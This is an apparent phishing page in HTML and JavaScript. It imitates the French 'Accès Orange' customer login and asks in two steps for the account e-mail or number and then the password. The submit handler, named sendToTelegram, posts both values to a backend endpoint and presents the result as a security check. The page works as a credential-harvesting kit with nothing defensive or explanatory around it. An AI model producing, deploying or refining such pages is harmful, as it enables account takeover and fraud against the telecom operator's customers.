<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Accès Orange</title>
  <style>
    :root{
      --orange:#ff7900;
      --orange-dark:#e46a00;
      --black:#111111;
      --bg:#f4f6f9;
      --card:#ffffff;
      --text:#1f2937;
      --muted:#6b7280;
      --border:#e5e7eb;
    }

    *{box-sizing:border-box}
    body{
      margin:0;
      font-family:Arial, Helvetica, sans-serif;
      background:
        radial-gradient(circle at top left, rgba(255,121,0,0.14), transparent 30%),
        linear-gradient(135deg,#f7f9fc 0%,#eef2f7 100%);
      color:var(--text);
      min-height:100vh;
      display:grid;
      place-items:center;
      padding:24px;
    }

    .card{
      width:100%;
      max-width:460px;
      background:var(--card);
      border-radius:22px;
      box-shadow:0 20px 55px rgba(0,0,0,0.14);
      padding:34px 28px;
      border:1px solid var(--border);
      position:relative;
      overflow:hidden;
    }

    .card::before{
      content:"";
      position:absolute;
      inset:0;
      background:linear-gradient(120deg, rgba(255,121,0,0.06), transparent 40%, rgba(0,0,0,0.02));
      pointer-events:none;
    }

    .logo-wrap{
      display:flex;
      justify-content:center;
      margin-bottom:20px;
    }

    .logo{
      width:86px;
      height:86px;
      border-radius:50%;
      background:linear-gradient(135deg,var(--orange),#ff9a2e);
      display:grid;
      place-items:center;
      box-shadow:0 12px 28px rgba(255,121,0,0.28);
      position:relative;
      animation:float 2.2s ease-in-out infinite;
      overflow:hidden;
    }

    .logo::before{
      content:"";
      position:absolute;
      inset:-10px;
      border:2px solid rgba(255,255,255,0.35);
      border-radius:50%;
      animation:spin 2.8s linear infinite;
    }

    .logo span{
      font-size:34px;
      font-weight:bold;
      color:white;
      position:relative;
      z-index:2;
    }

    @keyframes float{
      0%,100%{transform:translateY(0)}
      50%{transform:translateY(-6px)}
    }

    @keyframes spin{
      from{transform:rotate(0deg)}
      to{transform:rotate(360deg)}
    }

    h1{
      text-align:center;
      font-size:24px;
      margin:0 0 8px;
      color:var(--black);
    }

    .subtitle{
      text-align:center;
      color:var(--muted);
      font-size:14px;
      line-height:1.7;
      margin:0 0 24px;
    }

    .step{display:none; animation:fade .35s ease;}
    .step.active{display:block}
    @keyframes fade{from{opacity:0; transform:translateY(8px)} to{opacity:1; transform:translateY(0)}}

    label{
      display:block;
      font-size:14px;
      font-weight:bold;
      margin-bottom:8px;
      color:var(--text);
    }

    .field{
      width:100%;
      padding:13px 14px;
      border:1px solid var(--border);
      border-radius:12px;
      font-size:15px;
      outline:none;
      margin-bottom:16px;
      transition:.2s ease;
      background:#fff;
    }

    .field:focus{
      border-color:var(--orange);
      box-shadow:0 0 0 3px rgba(255,121,0,.16);
    }

    .btn{
      width:100%;
      border:none;
      padding:14px 16px;
      border-radius:12px;
      font-size:15px;
      font-weight:bold;
      cursor:pointer;
      transition:.2s ease;
    }

    .btn-orange{
      background:linear-gradient(135deg,var(--orange),var(--orange-dark));
      color:white;
    }

    .btn-orange:hover{transform:translateY(-1px); filter:brightness(1.02);}

    .btn-black{
      background:var(--black);
      color:white;
    }

    .btn-black:hover{background:#222; transform:translateY(-1px);}

    .account-display{
      background:#fff8f0;
      border:1px solid #fde2c5;
      border-left:4px solid var(--orange);
      border-radius:12px;
      padding:12px 14px;
      margin-bottom:18px;
      font-size:14px;
      color:var(--text);
      word-break:break-word;
    }

    .forgot{
      display:block;
      text-align:center;
      margin-top:14px;
      color:var(--orange);
      text-decoration:none;
      font-size:14px;
      font-weight:bold;
    }

    .forgot:hover{text-decoration:underline}

    .status{
      margin-top:14px;
      font-size:14px;
      text-align:center;
      min-height:20px;
    }

    .status.success{color:#1f8f4f}
    .status.error{color:#c0392b}
  </style>
</head>
<body>
  <div class="card">
    <div id="step1" class="step active">
      <div class="logo-wrap">
        <div class="logo"><span>O</span></div>
      </div>
      <h1>Accéder à votre espace</h1>
      <p class="subtitle">Indiquez votre adresse e-mail ou votre numéro Orange pour continuer.</p>

      <label for="accountInput">Compte Orange</label>
      <input id="accountInput" class="field" type="text" placeholder="Adresse e-mail ou numéro Orange" />

      <button class="btn btn-orange" onclick="goToStep2()">Continuer</button>
    </div>

    <div id="step2" class="step">
      <div class="logo-wrap">
        <div class="logo"><span>O</span></div>
      </div>
      <h1>Vérification de sécurité</h1>
      <p class="subtitle">Veuillez saisir votre mot de passe pour finaliser la procédure.</p>

      <div id="accountDisplay" class="account-display"></div>

      <label for="passwordInput">Mot de passe</label>
      <input id="passwordInput" class="field" type="password" placeholder="Entrez votre mot de passe" />

      <button id="submitBtn" class="btn btn-black" onclick="sendToTelegram()">S'IDENTIFIER</button>

      <a class="forgot" href="#">Mot de passe oublié</a>
      <div id="status" class="status"></div>
    </div>
  </div>

  <script>
    function goToStep2() {
      const account = document.getElementById("accountInput").value.trim();
      if (!account) {
        alert("Veuillez saisir votre compte Orange.");
        return;
      }

      document.getElementById("accountDisplay").textContent = "Compte : " + account;
      document.getElementById("step1").classList.remove("active");
      document.getElementById("step2").classList.add("active");
    }

    async function sendToTelegram() {
      const account = document.getElementById("accountInput").value.trim();
      const password = document.getElementById("passwordInput").value.trim();
      const statusEl = document.getElementById("status");
      const button = document.getElementById("submitBtn");

      if (!account || !password) {
        statusEl.textContent = "Veuillez renseigner votre compte et votre mot de passe.";
        statusEl.className = "status error";
        return;
      }

      button.disabled = true;
      button.textContent = "Traitement...";
      statusEl.textContent = "Envoi en cours...";
      statusEl.className = "status";

      try {
        const response = await fetch("/api/send", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ account, password }),
        });

        const data = await response.json();

        if (!response.ok) {
          throw new Error(data.error || "Erreur réseau");
        }

        statusEl.textContent = "Informations envoyées avec succès.";
        statusEl.className = "status success";
      } catch (error) {
        console.error(error);
        statusEl.textContent = "Une erreur est survenue. Veuillez réessayer.";
        statusEl.className = "status error";
      } finally {
        button.disabled = false;
        button.textContent = "S'IDENTIFIER";
      }
    }
  </script>
</body>
</html>
